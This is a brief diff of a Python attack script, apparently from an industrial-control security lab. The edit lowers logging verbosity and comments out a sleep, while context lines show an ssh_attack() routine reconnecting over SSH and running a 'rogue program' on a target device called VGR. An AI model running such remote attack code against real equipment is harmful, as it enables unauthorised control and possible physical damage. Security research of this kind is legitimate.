@@ -17,7 +17,7 @@ import random
 # asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
 
 logger = logging.getLogger("attack_order")
-logging.basicConfig(format="%(asctime)s - %(levelname)s - %(message)s", level=logging.DEBUG)
+logging.basicConfig(format="%(asctime)s - %(levelname)s - %(message)s", level=logging.INFO)
 
 # suppress needless logging info from imported modules
 logging.getLogger("paramiko").setLevel(logging.WARNING)
@@ -109,7 +109,7 @@ async def ssh_attack():
 
     # now run the rogue program
     ssh.exec_command('./TxtParkPosVGR')
-    time.sleep(2)
+    # time.sleep(2)
     ssh.connect(server, port, username, password, look_for_keys=False, allow_agent=False)
     ssh.exec_command('./TxtParkPosVGR')
     logging.info("Connected via SCP/SSH. Attack program uploaded and executed on target VGR.")
